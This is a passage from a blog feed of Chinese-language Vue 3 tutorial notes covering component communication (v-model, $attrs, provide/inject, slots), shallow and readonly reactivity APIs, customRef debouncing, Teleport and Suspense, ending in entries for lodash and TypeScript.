defineEmits([&#x27;update:model-value&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>也可以更换<code>value</code>，例如改成<code>abc</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 也可以更换value，例如改成abc--&gt;</span><br><span class="line">&lt;AtguiguInput v-model:abc=&quot;userName&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 上面代码的本质如下 --&gt;</span><br><span class="line">&lt;AtguiguInput :abc=&quot;userName&quot; @update:abc=&quot;userName = $event&quot;/&gt;</span><br></pre></td></tr></table></figure><p><code>AtguiguInput</code>组件中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;input </span><br><span class="line">       type=&quot;text&quot; </span><br><span class="line">       :value=&quot;abc&quot; </span><br><span class="line">       @input=&quot;emit(&#x27;update:abc&#x27;,$event.target.value)&quot;</span><br><span class="line">    &gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;AtguiguInput&quot;&gt;</span><br><span class="line">  // 接收props</span><br><span class="line">  defineProps([&#x27;abc&#x27;])</span><br><span class="line">  // 声明事件</span><br><span class="line">  const emit = defineEmits([&#x27;update:abc&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>如果<code>value</code>可以更换，那么就可以在组件标签上多次使用<code>v-model</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;AtguiguInput v-model:abc=&quot;userName&quot; v-model:xyz=&quot;password&quot;/&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-5-【-attrs-】"><a href="#6-5-【-attrs-】" class="headerlink" title="6.5.【$attrs 】"></a>6.5.【$attrs 】</h2><ol><li><p>概述：<code>$attrs</code>用于实现<strong>当前组件的父组件</strong>，向<strong>当前组件的子组件</strong>通信（<strong>祖→孙</strong>）。</p></li><li><p>具体说明：<code>$attrs</code>是一个对象，包含所有父组件传入的标签属性。</p><blockquote><p> 注意：<code>$attrs</code>会自动排除<code>props</code>中声明的属性(可以认为声明过的 <code>props</code> 被子组件自己“消费”了)</p></blockquote></li></ol><p>父组件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件&lt;/h3&gt;</span><br><span class="line">&lt;Child :a=&quot;a&quot; :b=&quot;b&quot; :c=&quot;c&quot; :d=&quot;d&quot; v-bind=&quot;&#123;x:100,y:200&#125;&quot; :updateA=&quot;updateA&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br><span class="line">let a = ref(1)</span><br><span class="line">let b = ref(2)</span><br><span class="line">let c = ref(3)</span><br><span class="line">let d = ref(4)</span><br><span class="line"></span><br><span class="line">function updateA(value)&#123;</span><br><span class="line">a.value = value</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>子组件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;child&quot;&gt;</span><br><span class="line">&lt;h3&gt;子组件&lt;/h3&gt;</span><br><span class="line">&lt;GrandChild v-bind=&quot;$attrs&quot;/&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Child&quot;&gt;</span><br><span class="line">import GrandChild from &#x27;./GrandChild.vue&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>孙组件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class=&quot;grand-child&quot;&gt;</span><br><span class="line">&lt;h3&gt;孙组件&lt;/h3&gt;</span><br><span class="line">&lt;h4&gt;a：&#123;&#123; a &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;b：&#123;&#123; b &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;c：&#123;&#123; c &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;d：&#123;&#123; d &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;x：&#123;&#123; x &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;h4&gt;y：&#123;&#123; y &#125;&#125;&lt;/h4&gt;</span><br><span class="line">&lt;button @click=&quot;updateA(666)&quot;&gt;点我更新A&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;GrandChild&quot;&gt;</span><br><span class="line">defineProps([&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;updateA&#x27;])</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="6-6-【-refs、-parent】"><a href="#6-6-【-refs、-parent】" class="headerlink" title="6.6. 【$refs、$parent】"></a>6.6. 【$refs、$parent】</h2><ol><li><p>概述：</p><ul><li><code>$refs</code>用于 ：<strong>父→子。</strong></li><li><code>$parent</code>用于：<strong>子→父。</strong></li></ul></li><li><p>原理如下：</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td><code>$refs</code></td><td>值为对象，包含所有被<code>ref</code>属性标识的<code>DOM</code>元素或组件实例。</td></tr><tr><td><code>$parent</code></td><td>值为对象，当前组件的父组件实例对象。</td></tr></tbody></table></li></ol><h2 id="6-7-【provide、inject】"><a href="#6-7-【provide、inject】" class="headerlink" title="6.7. 【provide、inject】"></a>6.7. 【provide、inject】</h2><ol><li><p>概述：实现<strong>祖孙组件</strong>直接通信</p></li><li><p>具体使用：</p><ul><li>在祖先组件中通过<code>provide</code>配置向后代组件提供数据</li><li>在后代组件中通过<code>inject</code>配置来声明接收数据</li></ul></li><li><p>具体编码：</p><p>【第一步】父组件中，使用<code>provide</code>提供数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;father&quot;&gt;</span><br><span class="line">    &lt;h3&gt;父组件&lt;/h3&gt;</span><br><span class="line">    &lt;h4&gt;资产：&#123;&#123; money &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;h4&gt;汽车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">    &lt;button @click=&quot;money += 1&quot;&gt;资产+1&lt;/button&gt;</span><br><span class="line">    &lt;button @click=&quot;car.price += 1&quot;&gt;汽车价格+1&lt;/button&gt;</span><br><span class="line">    &lt;Child/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot; name=&quot;Father&quot;&gt;</span><br><span class="line">  import Child from &#x27;./Child.vue&#x27;</span><br><span class="line">  import &#123; ref,reactive,provide &#125; from &quot;vue&quot;;</span><br><span class="line">  // 数据</span><br><span class="line">  let money = ref(100)</span><br><span class="line">  let car = reactive(&#123;</span><br><span class="line">    brand:&#x27;奔驰&#x27;,</span><br><span class="line">    price:100</span><br><span class="line">  &#125;)</span><br><span class="line">  // 用于更新money的方法</span><br><span class="line">  function updateMoney(value:number)&#123;</span><br><span class="line">    money.value += value</span><br><span class="line">  &#125;</span><br><span class="line">  // 提供数据</span><br><span class="line">  provide(&#x27;moneyContext&#x27;,&#123;money,updateMoney&#125;)</span><br><span class="line">  provide(&#x27;car&#x27;,car)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意：子组件中不用编写任何东西，是不受到任何打扰的</p></blockquote><p>【第二步】孙组件中使用<code>inject</code>配置项接受数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   &lt;template&gt;</span><br><span class="line">     &lt;div class=&quot;grand-child&quot;&gt;</span><br><span class="line">       &lt;h3&gt;我是孙组件&lt;/h3&gt;</span><br><span class="line">       &lt;h4&gt;资产：&#123;&#123; money &#125;&#125;&lt;/h4&gt;</span><br><span class="line">       &lt;h4&gt;汽车：&#123;&#123; car &#125;&#125;&lt;/h4&gt;</span><br><span class="line">       &lt;button @click=&quot;updateMoney(6)&quot;&gt;点我&lt;/button&gt;</span><br><span class="line">     &lt;/div&gt;</span><br><span class="line">   &lt;/template&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script setup lang=&quot;ts&quot; name=&quot;GrandChild&quot;&gt;</span><br><span class="line">     import &#123; inject &#125; from &#x27;vue&#x27;;</span><br><span class="line">     // 注入数据</span><br><span class="line">    let &#123;money,updateMoney&#125; = inject(&#x27;moneyContext&#x27;,&#123;money:0,updateMoney:(x:number)=&gt;&#123;&#125;&#125;)</span><br><span class="line">     let car = inject(&#x27;car&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-8-【pinia】"><a href="#6-8-【pinia】" class="headerlink" title="6.8. 【pinia】"></a>6.8. 【pinia】</h2><p>参考之前<code>pinia</code>部分的讲解</p><h2 id="6-9-【slot】"><a href="#6-9-【slot】" class="headerlink" title="6.9. 【slot】"></a>6.9. 【slot】</h2><h3 id="1-默认插槽"><a href="#1-默认插槽" class="headerlink" title="1. 默认插槽"></a>1. 默认插槽</h3><p><img src="http://49.232.112.44/images/default_slot.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category title=&quot;今日热门游戏&quot;&gt;</span><br><span class="line">          &lt;ul&gt;</span><br><span class="line">            &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">          &lt;/ul&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">          &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;</span><br><span class="line">            &lt;!-- 默认插槽 --&gt;</span><br><span class="line">            &lt;slot&gt;&lt;/slot&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="2-具名插槽"><a href="#2-具名插槽" class="headerlink" title="2. 具名插槽"></a>2. 具名插槽</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">        &lt;Category title=&quot;今日热门游戏&quot;&gt;</span><br><span class="line">          &lt;template v-slot:s1&gt;</span><br><span class="line">            &lt;ul&gt;</span><br><span class="line">              &lt;li v-for=&quot;g in games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">            &lt;/ul&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;template #s2&gt;</span><br><span class="line">            &lt;a href=&quot;&quot;&gt;更多&lt;/a&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">        &lt;/Category&gt;</span><br><span class="line">子组件中：</span><br><span class="line">        &lt;template&gt;</span><br><span class="line">          &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">            &lt;h3&gt;&#123;&#123; title &#125;&#125;&lt;/h3&gt;</span><br><span class="line">            &lt;slot name=&quot;s1&quot;&gt;&lt;/slot&gt;</span><br><span class="line">            &lt;slot name=&quot;s2&quot;&gt;&lt;/slot&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/template&gt;</span><br></pre></td></tr></table></figure><h3 id="3-作用域插槽"><a href="#3-作用域插槽" class="headerlink" title="3. 作用域插槽"></a>3. 作用域插槽</h3><ol><li><p>理解：<span style="color:red">数据在组件的自身，但根据数据生成的结构需要组件的使用者来决定。</span>（新闻数据在<code>News</code>组件中，但使用数据所遍历出来的结构由<code>App</code>组件决定）</p></li><li><p>具体编码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">父组件中：</span><br><span class="line">      &lt;Game v-slot=&quot;params&quot;&gt;</span><br><span class="line">      &lt;!-- &lt;Game v-slot:default=&quot;params&quot;&gt; --&gt;</span><br><span class="line">      &lt;!-- &lt;Game #default=&quot;params&quot;&gt; --&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">          &lt;li v-for=&quot;g in params.games&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">      &lt;/Game&gt;</span><br><span class="line"></span><br><span class="line">子组件中：</span><br><span class="line">      &lt;template&gt;</span><br><span class="line">        &lt;div class=&quot;category&quot;&gt;</span><br><span class="line">          &lt;h2&gt;今日游戏榜单&lt;/h2&gt;</span><br><span class="line">          &lt;slot :games=&quot;games&quot; a=&quot;哈哈&quot;&gt;&lt;/slot&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line"></span><br><span class="line">      &lt;script setup lang=&quot;ts&quot; name=&quot;Category&quot;&gt;</span><br><span class="line">        import &#123;reactive&#125; from &#x27;vue&#x27;</span><br><span class="line">        let games = reactive([</span><br><span class="line">          &#123;id:&#x27;asgdytsa01&#x27;,name:&#x27;英雄联盟&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa02&#x27;,name:&#x27;王者荣耀&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa03&#x27;,name:&#x27;红色警戒&#x27;&#125;,</span><br><span class="line">          &#123;id:&#x27;asgdytsa04&#x27;,name:&#x27;斗罗大陆&#x27;&#125;</span><br><span class="line">        ])</span><br><span class="line">      &lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h1 id="7-其它-API"><a href="#7-其它-API" class="headerlink" title="7. 其它 API"></a>7. 其它 API</h1><h2 id="7-1-【shallowRef-与-shallowReactive-】"><a href="#7-1-【shallowRef-与-shallowReactive-】" class="headerlink" title="7.1.【shallowRef 与 shallowReactive 】"></a>7.1.【shallowRef 与 shallowReactive 】</h2><h3 id="shallowRef"><a href="#shallowRef" class="headerlink" title="shallowRef"></a><code>shallowRef</code></h3><ol><li><p>作用：创建一个响应式数据，但只对顶层属性进行响应式处理。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myVar = <span class="title function_">shallowRef</span>(initialValue);</span><br></pre></td></tr></table></figure></li><li><p>特点：只跟踪引用值的变化，不关心值内部的属性变化。</p></li></ol><h3 id="shallowReactive"><a href="#shallowReactive" class="headerlink" title="shallowReactive"></a><code>shallowReactive</code></h3><ol><li><p>作用：创建一个浅层响应式对象，只会使对象的最顶层属性变成响应式的，对象内部的嵌套属性则不会变成响应式的</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myObj = <span class="title function_">shallowReactive</span>(&#123; ... &#125;);</span><br></pre></td></tr></table></figure></li><li><p>特点：对象的顶层属性是响应式的，但嵌套对象的属性不是。</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>通过使用 <a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowref"><code>shallowRef()</code></a> 和 <a href="https://cn.vuejs.org/api/reactivity-advanced.html#shallowreactive"><code>shallowReactive()</code></a> 来绕开深度响应。浅层式 <code>API</code> 创建的状态只在其顶层是响应式的，对所有深层的对象不会做任何处理，避免了对每一个内部属性做响应式所带来的性能成本，这使得属性的访问变得更快，可提升性能。</p></blockquote><h2 id="7-2-【readonly-与-shallowReadonly】"><a href="#7-2-【readonly-与-shallowReadonly】" class="headerlink" title="7.2.【readonly 与 shallowReadonly】"></a>7.2.【readonly 与 shallowReadonly】</h2><h3 id="readonly"><a href="#readonly" class="headerlink" title="readonly"></a><strong><code>readonly</code></strong></h3><ol><li><p>作用：用于创建一个对象的深只读副本。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> original = <span class="title function_">reactive</span>(&#123; ... &#125;);</span><br><span class="line"><span class="keyword">const</span> readOnlyCopy = <span class="title function_">readonly</span>(original);</span><br></pre></td></tr></table></figure></li><li><p>特点：</p><ul><li>对象的所有嵌套属性都将变为只读。</li><li>任何尝试修改这个对象的操作都会被阻止（在开发模式下，还会在控制台中发出警告）。</li></ul></li><li><p>应用场景：</p><ul><li>创建不可变的状态快照。</li><li>保护全局状态或配置不被修改。</li></ul></li></ol><h3 id="shallowReadonly"><a href="#shallowReadonly" class="headerlink" title="shallowReadonly"></a><strong><code>shallowReadonly</code></strong></h3><ol><li><p>作用：与 <code>readonly</code> 类似，但只作用于对象的顶层属性。</p></li><li><p>用法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> original = <span class="title function_">reactive</span>(&#123; ... &#125;);</span><br><span class="line"><span class="keyword">const</span> shallowReadOnlyCopy = <span class="title function_">shallowReadonly</span>(original);</span><br></pre></td></tr></table></figure></li><li><p>特点：</p><ul><li><p>只将对象的顶层属性设置为只读，对象内部的嵌套属性仍然是可变的。</p></li><li><p>适用于只需保护对象顶层属性的场景。</p></li></ul></li></ol><h2 id="7-3-【toRaw-与-markRaw】"><a href="#7-3-【toRaw-与-markRaw】" class="headerlink" title="7.3.【toRaw 与 markRaw】"></a>7.3.【toRaw 与 markRaw】</h2><h3 id="toRaw"><a href="#toRaw" class="headerlink" title="toRaw"></a><code>toRaw</code></h3><ol><li><p>作用：用于获取一个响应式对象的原始对象， <code>toRaw</code> 返回的对象不再是响应式的，不会触发视图更新。</p><blockquote><p>官网描述：这是一个可以用于临时读取而不引起代理访问/跟踪开销，或是写入而不触发更改的特殊方法。不建议保存对原始对象的持久引用，请谨慎使用。</p></blockquote><blockquote><p>何时使用？ —— 在需要将响应式对象传递给非 <code>Vue</code> 的库或外部系统时，使用 <code>toRaw</code> 可以确保它们收到的是普通对象</p></blockquote></li><li><p>具体编码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; reactive,toRaw,markRaw,isReactive &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* toRaw */</span></span><br><span class="line"><span class="comment">// 响应式对象</span></span><br><span class="line"><span class="keyword">let</span> person = <span class="title function_">reactive</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;)</span><br><span class="line"><span class="comment">// 原始对象</span></span><br><span class="line"><span class="keyword">let</span> rawPerson = <span class="title function_">toRaw</span>(person)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* markRaw */</span></span><br><span class="line"><span class="keyword">let</span> citysd = <span class="title function_">markRaw</span>([</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda01&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;北京&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda02&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;上海&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda03&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;天津&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda04&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;重庆&#x27;</span>&#125;</span><br><span class="line">])</span><br><span class="line"><span class="comment">// 根据原始对象citys去创建响应式对象citys2 —— 创建失败，因为citys被markRaw标记了</span></span><br><span class="line"><span class="keyword">let</span> citys2 = <span class="title function_">reactive</span>(citys)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(person))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(rawPerson))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(citys))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">isReactive</span>(citys2))</span><br></pre></td></tr></table></figure></li></ol><h3 id="markRaw"><a href="#markRaw" class="headerlink" title="markRaw"></a><code>markRaw</code></h3><ol><li><p>作用：标记一个对象，使其<strong>永远不会</strong>变成响应式的。</p><blockquote><p>例如使用<code>mockjs</code>时，为了防止误把<code>mockjs</code>变为响应式对象，可以使用 <code>markRaw</code> 去标记<code>mockjs</code></p></blockquote></li><li><p>编码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* markRaw */</span></span><br><span class="line"><span class="keyword">let</span> citys = <span class="title function_">markRaw</span>([</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda01&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;北京&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda02&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;上海&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda03&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;天津&#x27;</span>&#125;,</span><br><span class="line">  &#123;<span class="attr">id</span>:<span class="string">&#x27;asdda04&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;重庆&#x27;</span>&#125;</span><br><span class="line">])</span><br><span class="line"><span class="comment">// 根据原始对象citys去创建响应式对象citys2 —— 创建失败，因为citys被markRaw标记了</span></span><br><span class="line"><span class="keyword">let</span> citys2 = <span class="title function_">reactive</span>(citys)</span><br></pre></td></tr></table></figure></li></ol><h2 id="7-4-【customRef】"><a href="#7-4-【customRef】" class="headerlink" title="7.4.【customRef】"></a>7.4.【customRef】</h2><p>作用：创建一个自定义的<code>ref</code>，并对其依赖项跟踪和更新触发进行逻辑控制。</p><p>实现防抖效果（<code>useSumRef.ts</code>）：</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;customRef &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params">initValue:<span class="built_in">string</span>,delay:<span class="built_in">number</span></span>)&#123;</span><br><span class="line">  <span class="keyword">let</span> msg = <span class="title function_">customRef</span>(<span class="function">(<span class="params">track,trigger</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">timer</span>:<span class="built_in">number</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">track</span>() <span class="comment">// 告诉Vue数据msg很重要，要对msg持续关注，一旦变化就更新</span></span><br><span class="line">        <span class="keyword">return</span> initValue</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(timer)</span><br><span class="line">        timer = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          initValue = value</span><br><span class="line">          <span class="title function_">trigger</span>() <span class="comment">//通知Vue数据msg变化了</span></span><br><span class="line">        &#125;, delay);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;) </span><br><span class="line">  <span class="keyword">return</span> &#123;msg&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>组件中使用：</p><h1 id="8-Vue3新组件"><a href="#8-Vue3新组件" class="headerlink" title="8. Vue3新组件"></a>8. Vue3新组件</h1><h2 id="8-1-【Teleport】"><a href="#8-1-【Teleport】" class="headerlink" title="8.1. 【Teleport】"></a>8.1. 【Teleport】</h2><ul><li>什么是Teleport？—— Teleport 是一种能够将我们的<strong>组件html结构</strong>移动到指定位置的技术。</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">teleport</span> <span class="attr">to</span>=<span class="string">&#x27;body&#x27;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal&quot;</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是一个弹窗<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是弹窗中的一些内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isShow = false&quot;</span>&gt;</span>关闭弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">teleport</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="8-2-【Suspense】"><a href="#8-2-【Suspense】" class="headerlink" title="8.2. 【Suspense】"></a>8.2. 【Suspense】</h2><ul><li> 等待异步组件时渲染一些额外内容，让应用有更好的用户体验 </li><li>使用步骤： <ul><li> 异步引入组件</li><li> 使用<code>Suspense</code>包裹组件，并配置好<code>default</code> 与 <code>fallback</code></li></ul></li></ul><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineAsyncComponent,<span class="title class_">Suspense</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Child</span> = <span class="title function_">defineAsyncComponent</span>(<span class="function">()=&gt;</span><span class="keyword">import</span>(<span class="string">&#x27;./Child.vue&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">        &lt;h3&gt;我是App组件&lt;/h3&gt;</span><br><span class="line">        &lt;Suspense&gt;</span><br><span class="line">          &lt;template v-slot:default&gt;</span><br><span class="line">            &lt;Child/&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">          &lt;template v-slot:fallback&gt;</span><br><span class="line">            &lt;h3&gt;加载中.......&lt;/h3&gt;</span><br><span class="line">          &lt;/template&gt;</span><br><span class="line">        &lt;/Suspense&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><h2 id="8-3-【全局API转移到应用对象】"><a href="#8-3-【全局API转移到应用对象】" class="headerlink" title="8.3.【全局API转移到应用对象】"></a>8.3.【全局API转移到应用对象】</h2><ul><li><code>app.component</code></li><li><code>app.config</code></li><li><code>app.directive</code></li><li><code>app.mount</code></li><li><code>app.unmount</code></li><li><code>app.use</code></li></ul><h2 id="8-4-【其他】"><a href="#8-4-【其他】" class="headerlink" title="8.4.【其他】"></a>8.4.【其他】</h2><ul><li>过渡类名 <code>v-enter</code> 修改为 <code>v-enter-from</code>、过渡类名 <code>v-leave</code> 修改为 <code>v-leave-from</code>。</li></ul><ul><li><p><code>keyCode</code> 作为 <code>v-on</code> 修饰符的支持。</p></li><li><p><code>v-model</code> 指令在组件上的使用已经被重新设计，替换掉了 <code>v-bind.sync。</code></p></li><li><p><code>v-if</code> 和 <code>v-for</code> 在同一个元素身上使用时的优先级发生了变化。</p></li><li><p>移除了<code>$on</code>、<code>$off</code> 和 <code>$once</code> 实例方法。</p></li><li><p>移除了过滤器 <code>filter</code>。</p></li><li><p>移除了<code>$children</code> 实例 <code>propert</code>。</p><p>……</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue3+TypeScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue3+TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/07/lodash/"/>
      <url>/2023/10/07/lodash/</url>
      
        <content type="html"><![CDATA[<h1 id="https-www-lodashjs-com"><a href="#https-www-lodashjs-com" class="headerlink" title="https://www.lodashjs.com/"></a><a href="https://www.lodashjs.com/">https://www.lodashjs.com/</a></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript</title>
      <link href="/2023/09/26/TypeScript/"/>
      <url>/2023/09/26/TypeScript/</url>
      
